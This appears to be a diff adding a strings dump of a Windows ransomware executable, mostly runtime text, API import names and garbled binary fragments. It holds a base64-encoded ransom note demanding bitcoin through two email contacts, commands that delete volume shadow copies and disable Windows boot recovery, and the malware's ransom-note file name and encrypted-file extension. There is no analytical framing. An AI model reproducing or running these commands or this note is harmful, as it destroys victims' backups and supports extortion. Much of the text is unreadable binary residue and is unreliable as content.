@@ -1,0 +1,456 @@
+!This program cannot be run in DOS mode.
+oRich_
+`.rdata
+@.data
+.reloc
+jOhxtA
+D$ `_@
+WWj`h@
+L$\_^[3
+u'hlTA
+F\=(dA
+uhlTA
+^SSSSS
+HHtYHHt
+j@j ^V
+t"SS9] u
+PPPPPPPP
+PPPPPPPP
+URPQQh0
+;t$,v-
+UQPXY]Y[
+QQSVWd
+t=MOC
+HtHu4j
+t*=RCC
+;7|G;p
+tR99u2
+<+t"<-t
++t HHt
+invalid random_device value
+Unknown exception
+bad allocation
+SystemFunction036
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+CorExitProcess
+GetProcessWindowStation
+GetUserObjectInformationW
+GetLastActivePopup
+GetActiveWindow
+MessageBoxW
+(null)
+`h````
+xpxxxx
+`h`hhh
+xppwpp
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+ Complete Object Locator'
+ Class Hierarchy Descriptor'
+ Base Class Array'
+ Base Class Descriptor at (
+ Type Descriptor'
+`local static thread guard'
+`managed vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`vector copy constructor iterator'
+`dynamic atexit destructor for '
+`dynamic initializer for '
+`eh vector vbase copy constructor iterator'
+`eh vector copy constructor iterator'
+`managed vector destructor iterator'
+`managed vector constructor iterator'
+`placement delete[] closure'
+`placement delete closure'
+`omni callsig'
+ delete[]
+ new[]
+`local vftable constructor closure'
+`local vftable'
+`udt returning'
+`copy constructor closure'
+`eh vector vbase constructor iterator'
+`eh vector destructor iterator'
+`eh vector constructor iterator'
+`virtual displacement map'
+`vector vbase constructor iterator'
+`vector destructor iterator'
+`vector constructor iterator'
+`scalar deleting destructor'
+`default constructor closure'
+`vector deleting destructor'
+`vbase destructor'
+`string'
+`local static guard'
+`typeof'
+`vcall'
+`vbtable'
+`vftable'
+operator
+ delete
+__unaligned
+__restrict
+__ptr64
+__eabi
+__clrcall
+__fastcall
+__thiscall
+__stdcall
+__pascal
+__cdecl
+__based(
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+string too long
+invalid string position
+L&&jl66Z~??A
+Oh44\Q
+sb11S*
+uB!!c 
+D""fT**~;
+;d22Vt::N
+J%%o\..r8
+gg}V++
+jL&&Zl66A~??
+Sb11?*
+tX,,.4
+RRMv;;a
+MMUf33
+PPDx<<
+cB!!0 
+~~Gz==
+fD""~T**
+Vd22Nt::
+xxoJ%%r\..$8
+tt!>
+ppB|>>
+aa_j55
+UUxP((z
+&jL&6Zl6?A~?
+~=Gz=d
+"fD"*~T*
+2Vd2:Nt:
+x%oJ%.r\.
+t!>K
+a5_j5W
+=&&jL66Zl??A~
+g99KrJJ
+==Gzdd
+""fD**~T
+22Vd::Nt
+$$lH\\
+77Ynmm
+%%oJ..r\
+!>KK
+55_jWW
+WBW0FUVEVOVElPTl0NCg0KQWxsIG9mIHlvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCB3aXRoIFJTQS0yMDQ4IGFuZCBBRVMtMTI4IGNpcGhlcnMuDQpEZWNyeXB0aW5nIG9mIHlvdXIgZmlsZXMgaXMgb25seSBwb3NzaWJsZSB3aXRoIHRoZSBwcml2YXRlIGtleSBhbmQgZGVjcnlwdCBwcm9ncmFtLg0KDQpCYWNrdXBzIHdlcmUgZWl0aGVyIGVuY3J5cHRlZC4NClNoYWRvdyBjb3BpZXMgYWxzbyByZW1vdmVkLCBzbyBGOCBvciBhbnkgb3RoZXIgbWV0aG9kcyBtYXkgZGFtYWdlIGVuY3J5cHRlZCBkYXRhIGJ1dCBub3QgcmVjb3Zlci4NCldlIGV4Y2x1c2l2ZWx5IGhhdmUgZGVjcnlwdGlvbiBzb2Z0d2FyZSBmb3IgeW91ciBzaXR1YXRpb24uDQpObyBkZWNyeXB0aW9uIHNvZnR3YXJlIGlzIGF2YWlsYWJsZSBpbiB0aGUgcHVibGljLg0KDQpETyBOT1QgUkVTRVQgT1IgU0hVVERPV04gLWZpbGVzIG1heSBiZSBkYW1hZ2VkLg0KRE8gTk9UIERFTEVURSB0aGlzIGZpbGUuDQoNClRvIGNvbmZpcm0geW91ciBkZWNyeXB0aW9uIHNvZnR3YXJlLCBwbGVhc2Ugc2VuZCAyIG9yIDMgZGlmZmVyZW50IHJhbmRvbSBmaWxlcyBhbmQgeW91IHdpbGwgZ2V0IHRoZW0gZGVjcnlwdGVkLg0KDQpUbyBnZXQgZGVjcnlwdGlvbiwgcGxlYXNlIGNvbnRhY3QgdXMuDQpoYTdtZWR0aXRAdHV0YW5vdGEuY29tDQpvcg0KYXJhdWpvc2FudG9zQHByb3Rvbm1haWwuY29tDQoNCllvdSB3aWxsIHJlY2VpdmUgYnRjIGFkZHJlc3MgZm9yIHBheW1lbnQgaW4gdGhlIHJlcGx5IGxldHRlci
+AAABAFxXlqBiGEoIVCFtKr20ZRvXxz3w37go/PPD0q5ZfN931ybM+hNFwXrQUW8ObIVy/VMdGDDV5ecCnu1A92K4bDdSrnJaOaz0NQ5JajrDsL4Y/liX0eqL39js1CctQBRJsYauoYd9g3JTAY4BZxvYGZgFrwj0PSLulix/ztXyEMXUwzaRDmaWIT0JzEPgT2Cf04LfqHYHfXMzLw5R1lYz6SogduAGmsjsz1OSzjCcu/AtwZu1Cqi87t5UfzjPmvE1AOpMshOFdgtUwnxFeTNQqjn+X1Dj4aic37NYsDg7GBD6wClEXLXVRVaO/a3FHo+1m9TJoMMcUzpjNzgbhjD3D1//Bw==
+vssadmin.exe delete shadows /all /quiet
+bcdedit.exe /set {default} recoveryenabled no
+bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+bcdedit.exe /set {current} recoveryenabled no
+bcdedit.exe /set {current} bootstatuspolicy ignoreallfailures
+COM_%d
+bad exception
+1#QNAN
+1#SNAN
+GetModuleFileNameExW
+PSAPI.DLL
+GetCommandLineW
+GetComputerNameA
+GetFileSize
+FindFirstFileW
+GetDriveTypeW
+SetEndOfFile
+SetFilePointerEx
+GetLogicalDrives
+WriteFile
+OpenProcess
+GetExitCodeProcess
+TerminateProcess
+ReadFile
+CreateFileW
+FindClose
+Process32FirstW
+Process32NextW
+HeapSetInformation
+FindNextFileW
+CreateToolhelp32Snapshot
+WinExec
+CloseHandle
+GetWindowsDirectoryW
+GetCurrentProcessId
+KERNEL32.dll
+GetSystemMetrics
+RegisterClassW
+CreateWindowExW
+ShowWindow
+SetWindowLongW
+LoadCursorW
+USER32.dll
+GetStockObject
+GDI32.dll
+SHEmptyRecycleBinW
+SHGetSpecialFolderPathW
+CommandLineToArgvW
+SHELL32.dll
+WriteConsoleW
+GetFileType
+GetStdHandle
+GetModuleFileNameW
+HeapAlloc
+EncodePointer
+DecodePointer
+GetLastError
+MoveFileW
+GetCommandLineA
+GetStartupInfoW
+RaiseException
+FreeLibrary
+InterlockedExchange
+GetProcAddress
+LoadLibraryW
+GetCurrentProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+HeapFree
+IsProcessorFeaturePresent
+GetCPInfo
+InterlockedIncrement
+InterlockedDecrement
+GetACP
+GetOEMCP
+IsValidCodePage
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetModuleHandleW
+SetLastError
+GetCurrentThreadId
+EnterCriticalSection
+LeaveCriticalSection
+ExitProcess
+HeapCreate
+HeapSize
+GetModuleFileNameA
+FreeEnvironmentStringsW
+WideCharToMultiByte
+GetEnvironmentStringsW
+SetHandleCount
+InitializeCriticalSectionAndSpinCount
+DeleteCriticalSection
+QueryPerformanceCounter
+GetTickCount
+GetSystemTimeAsFileTime
+LCMapStringW
+MultiByteToWideChar
+GetStringTypeW
+RtlUnwind
+GetConsoleCP
+GetConsoleMode
+FlushFileBuffers
+HeapReAlloc
+SetFilePointer
+SetStdHandle
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVexception@std@@
+.?AVbad_alloc@std@@
+.?AVbad_exception@std@@
+0G0a0H3
+:R;^;h;p<u<D>W>
+>-?=?C?
+5$5<5C5v5
+;U;\;b;
+>,>T>Z>y>
+L0S0Y0p0w0|0
+7'717I7Q7]7c7i7o7u7
+7&8J8T8Y8_8q8
+9K:g:}:
+<<3<B<g<}<
+=#>9>D>_>p>
+?(?-?E?w?
+)060E0O0e0x0
+101=1Q1c1~1
+2#252E2
+5 5*5Y5c5w5
+6.686p6z6
+6*747I7Y7~7
+9!9)959=9I9Q9]9e9o9w9
+:):1:=:D:
+<*=\=t={=
+> >j>p>t>x>|>
+0G1O1d1o1
+2-33383@3P3Z3`3t3
+484h4q4
+6?7]7z7
+8+949l9
+:!;';6;~;
+<=<B<G<^<
+*2O2^2f2s2
+4'4-4]4c4
+5 5&5,52585?5F5M5T5[5b5i5q5y5
+7#757L8Q8
+;5;@;J;c;m;
+>->H>P>X>o>
+> ?1?E?
+(0|0?1m1
+373L3r3
+4!5)5r5x5
+6%6;6A6I6N6V6[6c6h6o6~6
+9/:6:C:I:
+;L<o<z<
+?"?1?>?J?Z?a?p?|?
+0E0T0]0
+2$2/2I2T2\2l2r2
+3+41494
+4K5T5Z5
+6&6+6<6D6J6T6Z6d6j6t6}6
+9-93989A9^9
+;<;X;{;
+;3<K<U<p<x<~<
+>L>U>a>
+??`?k?u?
+Q1b1j1p1u1{1
+2>3E3Z3
+404`4r4
+5.5Q5^5j5r5z5
+:6:=:V:j:p:y:
+?)?;?a?s?
+1L1d1k1s1x1|1
+2Z2`2d2h2l2
+>2B2F2J2N2R2V2Z2n2
+:j;|;2<S<\<
+=$?*?4?
+0X0e0~0
+2#2.2B3`3"5:5l5
+5U6o6x6
+8&9V9c9
+:#;.;\;j;
+0"0K0}0
+44%4)4/43494=4B4H4L4R4V4\4`4f4j4
+1c3v3D4e5^6
+<!=+=6=M?
+0n1|3f5
+:s;g<o< =
+>@?F?T?
+236@6N6~6
+8A9Q9a9r9z9
+2(2,202H2L2P2T2X2$5(5
+l2t2|2
+p2t2x2|2
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+> >$>4>8><>@>H>`>p>t>
+?$?<?L?P?`?d?h?p?
+0$0,040<0@0D0L0`0
+1 1,1H1T1p1
+282T2X2t2x2
+383X3x3
+4,4@4T4`4h4
+585D5x5
+6 6$6<6@6\6`6h6p6x6|6
+0 0@0`0
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+7 7$7(7,7074787<7@7D7H7L7P7T7X7\7`7d7h7l7p7t7x7
+8<8H8L8P8T8X8d8p8x8p<t<
+> >$>(>,>0>4>8><>@>P>T>X>\>`>d>h>l>p>t>
+Microsoft Visual C++ Runtime Library
+(Press Retry to debug the application - JIT must be enabled)
+For information on how your program can cause an assertion
+failure, see the Visual C++ documentation on asserts
+Expression: 
+Line: 
+File: 
+<program name unknown>
+Program: 
+Assertion failed!
+ADVAPI32.DLL
+AHH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+nKERNEL32.DLL
+mscoree.dll
+WUSER32.DLL
+runtime error 
+TLOSS error
+SING error
+DOMAIN error
+- Attempt to use MSIL code from this assembly during native code initialization
+This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.
+- not enough space for locale information
+- Attempt to initialize the CRT more than once.
+This indicates a bug in your application.
+- CRT not initialized
+- unable to initialize heap
+- not enough space for lowio initialization
+- not enough space for stdio initialization
+- pure virtual function call
+- not enough space for _onexit/atexit table
+- unable to open console device
+- unexpected heap error
+- unexpected multithread lock error
+- not enough space for thread data
+- abort() has been called
+- not enough space for environment
+- not enough space for arguments
+- floating point support not loaded
+ARuntime Error!
+Program: 
+(null)
+         (((((                  H
+         h((((                  H
+                                 H
+ACONOUT$
+Crypto\rsa.cpp
+blockSize > 0
+\Windows\
+DecryptGuide.txt
+Alad.alad
+System Volume Information
+internet explorer
+window
+@Assertion failed: %s, file %s, line %d
